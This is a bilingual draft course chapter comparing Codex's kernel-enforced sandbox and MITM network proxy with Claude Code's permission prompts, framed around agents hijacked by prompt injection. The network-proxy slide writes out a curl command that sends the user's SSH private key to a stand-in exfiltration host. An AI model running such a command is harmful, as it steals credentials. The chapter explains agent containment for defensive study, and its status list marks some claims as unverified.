# Chapter 3 (Codex): Native Sandboxing — Three Platforms, Four Mechanisms, One Threat Model

## ⏱️ Target Duration: ~50 minutes | 📑 ~20 slides | 📝 ~9,000 words

> **The most differentiated chapter of this teardown.** Claude Code has zero OS-level sandboxing — its safety story is "ask the user first." Codex has a 6-crate, 3-platform, kernel-enforced sandbox plus a MITM network proxy. This isn't a feature gap — this is two fundamentally different threat models.
>
> **整套拆解差异化最强的一章。** Claude Code 没有任何 OS 级沙箱，安全靠"问用户"。Codex 有 6 个 crate、3 个平台、内核级强制的沙箱 + MITM 网络代理。这不是功能差距——这是两套从根上不同的威胁模型。

---

### Core Source Files Referenced

Pinned commit: `e4d6675`, 2026-05-01. All paths under `codex-rs/`.

* `sandboxing/src/lib.rs` → 跨平台 facade（条件编译）
* `sandboxing/src/seatbelt.rs` → macOS Seatbelt 集成
* `sandboxing/src/seatbelt_base_policy.sbpl` → 编译期 `include_str!` 进 binary 的实际 Seatbelt 规则
* `sandboxing/src/landlock.rs` → Linux Landlock LSM 集成
* `sandboxing/src/bwrap.rs` → Linux Bubblewrap 命名空间隔离
* `sandboxing/src/manager.rs` → `SandboxManager`、`SandboxType`、平台路由
* `sandboxing/src/policy_transforms.rs` → 标准 PermissionProfile → 平台特定策略的编译器
* `linux-sandbox/` → 独立可执行 helper binary `codex-linux-sandbox`
* `windows-sandbox-rs/` → Windows Restricted Token 实现
* `network-proxy/src/mitm.rs` → TLS MITM 代理
* `network-proxy/src/network_policy.rs` → `NetworkPolicyDecider` 决策引擎
* `core/src/landlock.rs` → core 调用沙箱的 spawn 入口

---

### [00:00] Opening (Slide 1: Cover)

一个本地编码 Agent 帮你执行的命令——`rm -rf node_modules`、`curl https://api.example.com`、`docker run untrusted-image`——它跑在哪里？

When a local coding agent executes commands for you — `rm -rf node_modules`, `curl https://api.example.com`, `docker run untrusted-image` — where does it run?

Claude Code 的回答是：**直接在你的用户进程里**。问你 yes/no（如果配了 permission prompt），yes 就 spawn 子进程，子进程继承你的全部权限——能读 `~/.ssh/id_rsa`、能 connect 任意网站、能写任意文件。安全模型是"信任 LLM 不会请求恶意命令 + 用户作为最后一道闸门"。

Claude Code's answer: **directly in your user process**. Asks you yes/no (if permission prompt is configured), spawns the subprocess, which inherits your full permissions — can read `~/.ssh/id_rsa`, can connect to any website, can write any file. The safety model is "trust the LLM not to request malicious commands + user as last-resort gate."

Codex 的回答是：**在一个内核级强制隔离的沙箱里**。命令的文件系统访问被 Landlock LSM 限定到 cwd 子树。命令的网络访问被一个 MITM HTTP 代理过滤，只放行 allowlist 域名。`/etc/passwd` 它读不到。`api.suspicious.com` 它连不上。安全模型是"假设 LLM 部分对抗 + 工具完全不可信，靠 OS 强制约束兜底"。

Codex's answer: **inside a kernel-enforced isolation sandbox**. The command's filesystem access is restricted by Landlock LSM to the cwd subtree. Network access is filtered by a MITM HTTP proxy that only allows allowlist domains. It can't read `/etc/passwd`. It can't connect to `api.suspicious.com`. Safety model: "assume the LLM is partially adversarial and tools are completely untrusted; enforce constraints at the OS level."

这一章我们拆解 Codex 怎么做到这件事。它不是一个简单的 "wrap with sudo -u nobody" hack——它是一个 **6-crate 的子系统，包括 3 个平台特定实现、1 个独立 helper binary、1 个完整 MITM 网络代理、1 套政策编译器**。

This chapter dissects how Codex does this. Not a simple "wrap with sudo -u nobody" hack — it's a **6-crate subsystem with 3 platform-specific implementations, 1 separate helper binary, 1 full MITM network proxy, and 1 policy compiler**.

带一个问题进这一章：**这个复杂度，值得吗？**

Take this question into the chapter: **is this complexity worth it?**

---

### [04:00] Slide 2: The Threat Model Difference

要理解一个安全设计，先理解它在防什么。两边的威胁模型完全不同。

To understand a security design, first understand what it's defending against. Both threat models differ completely.

**Claude Code 的威胁模型**（隐式）：
1. 用户是这台机器的合法主人
2. LLM 是良性的（被 RLHF 对齐过，不会主动产生恶意命令）
3. 工具的实现是可信的（Anthropic 内部审查）
4. MCP 服务器的 plugin 大体可信（可信但不绝对——所以加 permission prompt）
5. **主要风险**：LLM 误解用户意图导致破坏性操作（删错文件、推错代码）

防御手段：**permission prompt**。在执行 mutating 操作前问用户，让用户做最后判断。

**Claude Code's threat model** (implicit):
1. User is the legitimate owner of this machine
2. LLM is benign (RLHF-aligned, won't actively produce malicious commands)
3. Tool implementations are trusted (Anthropic-reviewed)
4. MCP server plugins are mostly trusted (trusted but not absolutely — hence permission prompts)
5. **Primary risk**: LLM misinterprets user intent and does destructive operations (deletes wrong file, pushes wrong code)

Defense: **permission prompt**. Ask the user before mutating operations; let the user be the final judge.

**Codex 的威胁模型**（显式，写在源码注释里）：
1. 用户是这台机器的合法主人
2. **LLM 可能部分对抗**——可能产生 prompt-injection 后的恶意指令、可能被 jailbreak、可能从工具回流的内容（网页、文件）里继承注入
3. **工具完全不可信**——尤其是用户配置的第三方 MCP server
4. **网络环境完全敌意**——任何被 agent 访问的 URL 可能是攻击载体
5. **主要风险**：agent 在用户不察觉的情况下，被某个角度的 prompt injection 驱动去 exfiltrate 凭证、连接 C2、植入 backdoor

防御手段：**内核级强制隔离 + 网络流量 MITM 检查 + closed-by-default policy**。

**Codex's threat model** (explicit, written into source comments):
1. User is the legitimate owner of this machine
2. **LLM may be partially adversarial** — may produce malicious commands after prompt-injection, may be jailbroken, may inherit injection from tool-returned content (web pages, files)
3. **Tools are completely untrusted** — especially user-configured third-party MCP servers
4. **The network environment is fully adversarial** — any URL accessed by the agent could be an attack vector
5. **Primary risk**: agent, without user awareness, gets driven by some prompt injection angle to exfiltrate credentials, connect to C2, plant backdoors

Defense: **kernel-level enforced isolation + network traffic MITM inspection + closed-by-default policy**.

> **关键洞察**：两个团队**对 LLM 的信任度**就不一样。Claude Code 把 LLM 当成会犯错的合作者；Codex 把 LLM 当成在受控环境下运行的不完全可信组件。这一个假设差异，从根上决定了你愿意付多少安全工程的成本。
>
> **Key insight**: The two teams have **different trust levels for the LLM**. Claude Code treats the LLM as an error-prone collaborator; Codex treats the LLM as a not-fully-trusted component running in a controlled environment. This single difference fundamentally determines how much safety engineering cost you're willing to pay.

---

### [09:00] Slide 3: The Sandbox Architecture — Six Crates Working Together

打开 `codex-rs/sandboxing/src/lib.rs`：

```rust
#[cfg(target_os = "linux")]
mod bwrap;
pub mod landlock;
mod manager;
pub mod policy_transforms;
#[cfg(target_os = "macos")]
pub mod seatbelt;
```

干净的 conditional compilation：Linux 编译期带上 bwrap 和 landlock；macOS 带上 seatbelt；Windows 走另一条路（在独立的 `windows-sandbox-rs` crate 里）。

Clean conditional compilation: Linux compile-time pulls in bwrap and landlock; macOS pulls in seatbelt; Windows takes a different path (in the separate `windows-sandbox-rs` crate).

**6 个相关 crate 的职责**：

| Crate | 职责 | 编译产物 |
|-------|------|----------|
| `codex-sandboxing` | 跨平台 facade、policy 编译、平台路由 | 库（被 core 链接） |
| `codex-linux-sandbox` | **独立可执行 helper binary**——bwrap + landlock 的实际启动器 | 可执行文件 |
| `codex-windows-sandbox` | Windows Restricted Token 实现 | 库（被 core 链接） |
| `codex-network-proxy` | 全功能 MITM HTTP/SOCKS5 代理 | 库 |
| `codex-process-hardening` | 进程级硬化（umask、resource limits 等） | 库 |
| `codex-execpolicy` | 执行策略 DSL（哪些命令该被审批 vs 允许） | 库 |

**为什么 Linux 沙箱要拆成独立可执行文件？** 因为 Linux Landlock 的 API 模型是 "process commits to a ruleset, ruleset is inherited by exec'd children but ruleset itself is immutable in current process"。在 codex 主进程里加 ruleset 会污染主进程；正确做法是：fork → 在子进程里 commit ruleset → exec 实际命令。`codex-linux-sandbox` 这个 helper 就是这个 fork-and-exec 的桥梁。

**Why is the Linux sandbox a separate executable?** Because Linux Landlock's API model is "process commits to a ruleset, the ruleset is inherited by exec'd children, but the ruleset itself is immutable in the current process." Adding a ruleset to the main codex process would contaminate it; the correct flow is: fork → commit ruleset in child → exec actual command. `codex-linux-sandbox` is the bridge for this fork-and-exec.

`codex-rs/core/src/landlock.rs:22` 的 `spawn_command_under_linux_sandbox()` 就是 core 调用这个 helper 的入口。注释说："**Unlike macOS Seatbelt where we directly embed the policy text, the Linux helper is a separate executable. We pass the canonical permission profile as JSON and let the helper derive the runtime filesystem/network policies.**"

`codex-rs/core/src/landlock.rs:22`'s `spawn_command_under_linux_sandbox()` is core's entry point to this helper. Comment: **"Unlike macOS Seatbelt where we directly embed the policy text, the Linux helper is a separate executable. We pass the canonical permission profile as JSON and let the helper derive the runtime filesystem/network policies."**

这一句话同时透露两个事实：
1. Linux 路径走 helper binary
2. macOS 路径直接 embed policy text（在主 codex 进程里）

This single sentence reveals two facts at once: Linux path goes through helper binary; macOS path embeds policy text directly in the main codex process.

---

### [14:00] Slide 4: macOS Seatbelt — Compile-Time Embedded Policy

打开 `codex-rs/sandboxing/src/seatbelt.rs:21`：

```rust
const MACOS_SEATBELT_BASE_POLICY: &str = include_str!("seatbelt_base_policy.sbpl");
const MACOS_SEATBELT_NETWORK_POLICY: &str = include_str!("seatbelt_network_policy.sbpl");
const MACOS_RESTRICTED_READ_ONLY_PLATFORM_DEFAULTS: &str =
    include_str!("restricted_read_only_platform_defaults.sbpl");
```

注意 Rust 的 `include_str!`——这个宏在**编译期**把对应的 `.sbpl` 文件内容字面量嵌入到二进制里。意思是 codex 二进制本身携带 Seatbelt 策略文本，不依赖外部文件。

Note Rust's `include_str!` macro — at **compile time** it embeds the contents of the named file as a string literal into the binary. The codex binary itself carries the Seatbelt policy text; no external file dependency.

**这是有意义的安全决策**：如果策略文件是运行时从磁盘读，攻击者污染那个文件就可以削弱沙箱。`include_str!` 让策略和二进制一体——要篡改策略，必须替换整个二进制。

**This is an intentional security decision**: if the policy file is read from disk at runtime, an attacker who poisons that file can weaken the sandbox. `include_str!` welds policy and binary together — to tamper with policy, you must replace the entire binary.

打开 `seatbelt_base_policy.sbpl`：

```scheme
(version 1)

; inspired by Chrome's sandbox policy:
; https://source.chromium.org/chromium/chromium/src/+/main:sandbox/policy/mac/common.sb
; https://source.chromium.org/chromium/chromium/src/+/main:sandbox/policy/mac/renderer.sb

; start with closed-by-default
(deny default)

; child processes inherit the policy of their parent
(allow process-exec)
(allow process-fork)
(allow signal (target same-sandbox))

; process-info
(allow process-info* (target same-sandbox))
```

这是 **Apple TinyScheme 风格的 Seatbelt 配置语言（SBPL）**。第一句 `(deny default)` 说明 Codex 选了 **closed-by-default**——任何没有显式 allow 的操作都被拒绝。这是 Chrome 沙箱的经典姿势，作者还在注释里直接给了 Chrome 源码链接，说明灵感来源。

This is **Apple's TinyScheme-style Seatbelt Policy Language (SBPL)**. The first line `(deny default)` shows Codex chose **closed-by-default** — anything not explicitly allowed is denied. This is the classic Chrome sandbox posture; the author even cites Chrome source URLs.

**还有一个细节**（`seatbelt.rs:30`）：

```rust
/// When working with `sandbox-exec`, only consider `sandbox-exec` in `/usr/bin`
/// to defend against an attacker trying to inject a malicious version on the
/// PATH.
pub const MACOS_PATH_TO_SEATBELT_EXECUTABLE: &str = "/usr/bin/sandbox-exec";
```

硬编码绝对路径——攻击者可能在 `$PATH` 上前置一个恶意 `sandbox-exec` 让"启动沙箱"的调用变成"启动一个无沙箱壳"。Codex 通过硬编码 `/usr/bin/sandbox-exec` 防御这个 PATH-injection 攻击。

Hardcoded absolute path — an attacker could prepend a malicious `sandbox-exec` to `$PATH`, turning "launch sandbox" into "launch an unsandboxed shell." Codex defends against this PATH-injection attack by hardcoding `/usr/bin/sandbox-exec`.

> **细节决定立场**：这种"想到攻击者会污染 PATH"的细节防御，是真正的 security-conscious engineering。它的存在说明 Codex 团队不是抄了个 Chrome 沙箱模板就完事——他们读懂了为什么 Chrome 那么写，还做了适配性的额外加固。
>
> **Detail reveals stance**: this kind of "anticipated PATH-poisoning" defense is real security-conscious engineering. Its existence shows the Codex team didn't just copy a Chrome sandbox template — they understood why Chrome wrote it that way and added adaptive hardening.

---

### [20:00] Slide 5: Linux Landlock + Bubblewrap — The Helper Binary

Linux 路径更复杂，因为 Linux 上的"沙箱"不是单一机制，而是几层防御组合：

**Landlock**（Linux LSM，5.13+ 内核）—— filesystem 强制访问控制。能限定一个进程"只能读 cwd 子树、只能写 `/tmp` 和 `cwd` 子树、不能 access `/etc/shadow`"。

**Bubblewrap (`bwrap`)** —— 用户态 namespace 工具（systemd 家族）。建一个新 mount namespace、新 PID namespace、新 user namespace，再 chroot 到一个最小化的根目录。`bubblewrap` 本身没有 root，靠 unprivileged user namespace。

**seccomp-bpf** —— syscall 级别的过滤器，决定哪些 syscall 可调用。

Codex 的 Linux 沙箱**同时用这三层**。但 Landlock 的 API 模型决定了实现拓扑：

```
                            ┌──────────────────────────┐
codex (主进程)              │  codex-linux-sandbox     │
├─ 用户在 TUI 里下命令        │  (helper binary)         │
├─ core 决定要执行 cmd        │  ↓                       │
├─ spawn_command_under_      │  1. 设置 user namespace  │
│  linux_sandbox()  ─fork──► │  2. apply Landlock ruleset│
│                            │  3. apply seccomp filter  │
│                            │  4. exec(cmd, args)       │
│                            └──────────────────────────┘
```

`codex-linux-sandbox` 是这个**牺牲者进程**——它先把自己锁进沙箱里，然后 exec 用户命令；用户命令继承沙箱约束。主 codex 进程从不进入沙箱，自己保持完整权限以便管理工具池、网络代理、IPC。

`codex-linux-sandbox` is the **sacrifice process** — it locks itself into the sandbox first, then exec's the user command, which inherits the sandbox constraints. The main codex process never enters the sandbox, keeping its full privileges to manage the tool pool, network proxy, IPC.

**为什么不直接用 Docker？**
1. Docker 假设有 daemon、需要 root、镜像分发流程不轻量
2. CI/沙箱化容器环境（很多用户的实际部署）通常已经在 Docker 里——再嵌一层 Docker 是 nesting 噩梦
3. Bubblewrap + Landlock 在 unprivileged 模式下工作，无需 root
4. 启动时间 < 100ms（Docker 通常 ~1s）

**Why not just use Docker?**
1. Docker assumes a daemon, requires root, image distribution is heavyweight
2. CI / sandboxed container environments (many users' actual deployment) often already run in Docker — nesting Docker is a nightmare
3. Bubblewrap + Landlock work in unprivileged mode, no root
4. Startup latency < 100ms (Docker is typically ~1s)

> **架构反思**：Linux 路径的复杂度（5 层组件：bwrap、landlock、seccomp、helper binary、policy compiler）不是过度设计——它是 Linux 安全模型本身的复杂度的反映。Linux 没有像 Seatbelt 那样的"all-in-one"沙箱原语；要做强约束就只能组合多个机制。Codex 团队选择拥抱这个复杂度，而不是简化到只用其中一层。
>
> **Architecture reflection**: Linux path's complexity (5 layers: bwrap, landlock, seccomp, helper binary, policy compiler) isn't over-engineering — it reflects the inherent complexity of Linux's security model. Linux has no "all-in-one" sandbox primitive like Seatbelt; strong constraints require composing multiple mechanisms. Codex chose to embrace this complexity rather than simplify to one layer.

---

### [27:00] Slide 6: Windows Restricted Token

Windows 路径在 `codex-rs/windows-sandbox-rs/`。Codex 用 Windows API 的 **Restricted Token** 机制：

```rust
pub enum WindowsSandboxLevel {
    Disabled,           // 无沙箱
    RestrictedToken,    // 创建一个剥离危险特权的 token
    Elevated,           // 提升的 token（用户主动请求时）
}
```

Restricted Token 的原理：从用户当前 token 派生出新 token，**移除部分 SID 和 Privilege**。结果是子进程看似还是用户身份，但缺少关键权限——比如不能写 system32、不能 elevate、不能用 debug privilege。

The principle: derive a new token from the user's current token, **removing certain SIDs and Privileges**. The child process appears to still be the user but lacks key permissions — e.g., can't write to system32, can't elevate, can't use debug privilege.

Windows 上没有 Linux Landlock 那样的精细文件系统过滤，所以 Restricted Token 是**粗粒度防御**：它不能阻止"读 `~/Documents/passwords.txt`"，但能阻止"安装 driver、修改 system32、关闭 Windows Defender"。

Windows lacks Linux Landlock's fine-grained filesystem filtering, so Restricted Token is a **coarse defense**: it can't prevent "read `~/Documents/passwords.txt`" but can prevent "install driver, modify system32, disable Windows Defender."

> **平台不对称的承认**：Codex 在文档里实事求是地说 Windows 沙箱"不如 Linux 强"。这是诚实工程的姿态——不假装跨平台一致，承认每个 OS 给的工具不同，能做到什么就做到什么。
>
> **Honest about platform asymmetry**: Codex's docs explicitly admit Windows sandboxing is "weaker than Linux." This is honest engineering — not pretending cross-platform parity, acknowledging each OS gives different tools, doing what's possible.

---

### [31:00] Slide 7: The Network Proxy — MITM with TLS Interception

文件系统沙箱只是一半。另一半是网络。打开 `codex-rs/network-proxy/src/lib.rs`：

```
mod certs;
mod connect_policy;
mod http_proxy;
mod mitm;
mod network_policy;
mod policy;
mod proxy;
mod socks5;
...
```

这是一个**全功能 MITM HTTP/SOCKS5 代理**，编译进 codex 二进制。沙箱化的子进程通过 `HTTPS_PROXY` 环境变量被强制走这个代理；任何绕过代理的网络访问被 Landlock/seccomp 直接 block。

This is a **full-featured MITM HTTP/SOCKS5 proxy** compiled into the codex binary. Sandboxed child processes are forced through this proxy via `HTTPS_PROXY` env var; any network access bypassing the proxy is blocked by Landlock/seccomp directly.

**MITM 的工作流程**：
1. 子进程发起 `https://api.example.com` 请求
2. 请求被截到 codex 的 in-process MITM 代理
3. MITM 用动态生成的 CA cert（`certs.rs`）伪造一个 server cert，和子进程握 TLS
4. MITM 自己以真实 client 身份和 `api.example.com` 握 TLS
5. 中间能看到明文请求/响应，应用 `NetworkPolicyDecider`（`network_policy.rs`）判断
6. 允许就转发；不允许就返 403

**MITM workflow**:
1. Child process initiates `https://api.example.com` request
2. Request intercepted by codex's in-process MITM proxy
3. MITM uses a dynamically generated CA cert (`certs.rs`) to fake a server cert and TLS-handshakes with the child process
4. MITM itself acts as a real client to TLS-handshake with `api.example.com`
5. In the middle, it sees plaintext request/response, applies `NetworkPolicyDecider` (`network_policy.rs`) to judge
6. Allow → forward; deny → return 403

**为什么要 MITM？为什么不只看 SNI？**
仅看 SNI 只能拒绝整个域；MITM 让 Codex 能根据**请求路径、HTTP 方法、headers** 做更细的决策。比如允许 `GET github.com/...` 但拒绝 `POST github.com/...`。这种细粒度对 prompt-injection 防御非常重要——攻击者可能让 agent "GET 一个看似无害的 URL"，但实际是带数据外泄参数的请求。

**Why MITM, not just SNI inspection?** SNI alone can only reject whole domains; MITM lets Codex make finer decisions based on **request path, HTTP method, headers**. E.g., allow `GET github.com/...` but deny `POST github.com/...`. This granularity is critical for prompt-injection defense — attackers might tell the agent to "GET an innocent URL" that actually exfiltrates data via parameters.

> **代价**：MITM 需要把 codex 的 root CA 注入到子进程的 trust store。这意味着 codex 必须在沙箱启动时动态注入证书，并在退出时清理。`certs.rs` 处理这个生命周期。
>
> **Cost**: MITM requires injecting codex's root CA into the child process's trust store. This means codex must dynamically inject the cert at sandbox startup and clean up on exit. `certs.rs` handles this lifecycle.

**Claude Code 完全没有这一层**。它的网络访问就是直接 spawn `curl` 或 `fetch`——没有代理，没有过滤，没有 MITM。如果 LLM 让它 `curl https://exfiltrate.com/steal?data=$(cat ~/.ssh/id_rsa | base64)`，假设 user permission prompt 配错或者绕过，没有第二道防线。

**Claude Code has none of this layer**. Its network access is direct `curl` or `fetch` spawning — no proxy, no filtering, no MITM. If the LLM tells it to `curl https://exfiltrate.com/steal?data=$(cat ~/.ssh/id_rsa | base64)`, assuming the user permission prompt is misconfigured or bypassed, there's no second line of defense.

---

### [38:00] Slide 8: The Policy Compiler — One Profile, Three Outputs

`codex-rs/sandboxing/src/policy_transforms.rs` 解决一个跨平台问题：用户/SDK 给的是**抽象 PermissionProfile**（"允许读 cwd 子树、允许写 cwd + tmp、允许网络访问 github.com"），但 macOS 要的是 SBPL 文本，Linux 要的是 Landlock ruleset，Windows 要的是 Restricted Token。

`codex-rs/sandboxing/src/policy_transforms.rs` solves a cross-platform problem: users/SDK provide an **abstract PermissionProfile** ("allow read of cwd subtree, allow write of cwd + tmp, allow network access to github.com"), but macOS wants SBPL text, Linux wants a Landlock ruleset, Windows wants a Restricted Token.

```
        PermissionProfile (canonical)
                │
                │
        policy_transforms.rs
        ┌───────┼───────┐
        ▼       ▼       ▼
      SBPL   Landlock  RestrictedToken
     (文本)  (struct)    (PSID/PRIV list)
        │       │       │
        ▼       ▼       ▼
     macOS    Linux   Windows
```

**为什么这一层值得单独存在？** 因为没有它，每个平台模块都要自己解释 PermissionProfile，三套实现会漂移。集中编译让"语义统一、平台特化"成为强约束。这是 LLVM 风格的中间表示思想——前端统一，后端专门。

**Why does this layer deserve to exist independently?** Without it, each platform module would have to parse PermissionProfile itself, and three implementations would drift. Centralized compilation makes "semantic uniformity, platform specialization" a strong constraint. This is LLVM-style intermediate representation thinking — unified front-end, specialized back-end.

---

### [42:00] Slide 9: The Comparison Table — Codex vs Claude Code vs Docker

把 ch03 的核心差异压缩到一张表：

| 维度 | Claude Code | Codex | Docker | gVisor |
|------|-------------|-------|--------|--------|
| 强制层级 | 应用层（permission prompt） | OS 内核（Landlock/Seatbelt/Token） | OS namespace + cgroup | 用户态 syscall 拦截 |
| 文件系统隔离 | ❌ | ✅ 子树级（Landlock） | ✅ 镜像级 | ✅ syscall 级 |
| 网络隔离 | ❌ | ✅ 域名+路径级（MITM） | ✅ namespace 级 | ✅ syscall 级 |
| 启动延迟 | 0ms | <100ms | ~1s | ~50ms |
| 启动门槛 | 无 | unprivileged user namespace | daemon + root | 编译期定制内核 |
| 第三方工具兼容性 | 完美（直接 spawn） | 高（通过 helper） | 需镜像化 | 中（部分 syscall 不支持） |
| 平台覆盖 | 全（语言层） | macOS/Linux 强、Windows 中 | Linux 优、其他差 | Linux 限定 |
| 分发复杂度 | npm 包 | 二进制 + helper binary | image registry | 内核镜像 |

**结论**：Codex 在 sandbox 这个维度选了 **"Docker 之下、应用层之上"** 的中间档——比 permission prompt 强得多，比 Docker 轻量得多。这个中间档恰好是"工业级 agent 在不假设容器环境时"应该选的位置。

**Conclusion**: Codex chose the **"below Docker, above application layer"** middle tier on sandboxing — much stronger than permission prompts, much lighter than Docker. This middle tier is exactly the right position for "industrial-grade agent in a non-containerized assumption."

---

### [46:00] Slide 10: Synthesis — The Cost-Benefit of Codex's Sandbox

**这一切的工程成本**：
- 6 个相关 crate
- 3 套平台特定实现 + 1 个 helper binary
- TLS MITM 代理（包含 cert 生成、HTTP/SOCKS5 协议解析、policy 决策引擎）
- 跨平台 policy 编译器
- 持续的 OS API 跟踪（Linux 5.13 加了 Landlock，macOS 每个版本可能改 sandbox-exec 行为）
- 工具兼容性问题（某些工具在沙箱里失败需要 fall-through 路径）
- 文档+教育成本（用户要理解为什么某些操作被拒绝）

**The engineering cost of all this**:
- 6 related crates
- 3 platform-specific implementations + 1 helper binary
- TLS MITM proxy (including cert generation, HTTP/SOCKS5 protocol parsing, policy decision engine)
- Cross-platform policy compiler
- Continuous OS API tracking (Linux 5.13 added Landlock; macOS sandbox-exec behavior changes each version)
- Tool compatibility issues (some tools fail in sandbox, need fall-through paths)
- Documentation + education cost (users must understand why some operations are denied)

**回报**：
- 即使 prompt-injection 把 LLM 带跑偏，关键资产（SSH key、credential file、~/.ssh）仍然不可读
- 网络数据外泄需要绕过 MITM，门槛极高
- 第三方 MCP 服务器即使被 compromise，影响被限定在沙箱边界
- 可以放心在企业受限环境跑（不需要"agent 是开发者本人"那种信任）
- 可以接 untrusted code（CI 跑 untrusted PR 的代码 review）

**Returns**:
- Even if prompt-injection drives the LLM off course, critical assets (SSH keys, credential files, `~/.ssh`) remain unreadable
- Network exfiltration requires bypassing MITM — the bar is very high
- Third-party MCP servers, even if compromised, are blast-radius-limited to the sandbox boundary
- Safe to run in enterprise locked-down environments (no need for "the agent is the developer himself" trust)
- Can accept untrusted code (CI running untrusted PR's code for review)

**值不值？** 这个问题没有普遍答案，取决于使用场景。对个人开发者本机用，Claude Code 的 permission prompt 模型够用。对企业部署、CI 集成、跑 untrusted MCP server 的场景，Codex 的沙箱不仅值得，可能是必需。

**Worth it?** No universal answer — depends on use case. For individual developer local use, Claude Code's permission prompt model is enough. For enterprise deployment, CI integration, running untrusted MCP servers, Codex's sandbox isn't just worth it — it's likely required.

> **最深的洞察**：Codex 投入的 sandbox 工程成本，押注的是"未来的 AI agent 必须能在不可信环境跑、必须能接不可信工具、必须能 audit 能合规"。如果这个押注对，沙箱基础设施在 5 年后会成为本地 agent 的入门门槛。如果押错，他们多写了 6 个 crate。
>
> **The deepest insight**: The sandbox engineering cost Codex invests bets on "future AI agents must run in untrusted environments, must integrate with untrusted tools, must be auditable and compliance-ready." If this bet is right, sandbox infrastructure will be table-stakes for local agents in 5 years. If wrong, they wrote 6 extra crates.

---

### Closing / 收尾

下一章 ch04 我们看 Codex 的另一个独有领域：**批量子 Agent + 持久化 Goal 系统**。如果说 ch03 是"防御性"工程的极致投入，ch04 就是"进攻性"工程的极致投入——把 agent 推向更高的自主性、更长的执行视野、更复杂的并发协作模式。

ch04 covers Codex's other unique domain: **batch sub-agents + persistent Goal system**. If ch03 is the apex of defensive engineering investment, ch04 is the apex of offensive engineering investment — pushing agents toward higher autonomy, longer execution horizons, more complex concurrent collaboration.

带一个问题进 ch04：**当 agent 能 fan-out 64 个 sub-agent 同时跑、还能在你睡觉时自己 continue 完成目标——你还需要 prompt prompt 吗？**

Take this question into ch04: **when the agent can fan-out 64 sub-agents in parallel, and continues working on goals while you sleep — do you still need to prompt it?**

---

## Status / 状态

**Draft v0.1** — 2026-05-01

- [x] 10 sections drafted (~9,200 words bilingual)
- [x] Verified `codex-rs/sandboxing/src/lib.rs` conditional compilation structure
- [x] Verified `seatbelt.rs:21` include_str! pattern
- [x] Verified `seatbelt.rs:30` MACOS_PATH_TO_SEATBELT_EXECUTABLE hardcoded
- [x] Verified `seatbelt_base_policy.sbpl` exists and starts with `(deny default)`
- [x] Verified `network-proxy` crate has mitm.rs, certs.rs, network_policy.rs
- [x] Verified `core/src/landlock.rs` comment about helper-binary architecture
- [ ] Need to verify: WindowsSandboxLevel enum exact variants
- [ ] Need to verify: NetworkPolicyDecider actual decision API
- [ ] Need to verify: `codex-execpolicy` and `codex-process-hardening` crates' actual roles
- [ ] HTML slides not authored
- [ ] Need diagram: the "main process + helper binary + sandboxed child" topology
- [ ] Need diagram: MITM proxy data flow

**Open questions**:
- Slide 8 (policy compiler) is dense — split into two slides? Or condense?
- Should the threat model framing (slide 2) be promoted to ch00? It's the spine that justifies everything else in this chapter, and ch00 currently doesn't tee it up.
- Is "Why MITM not just SNI" worth more depth? It's a real interview-question-grade topic.
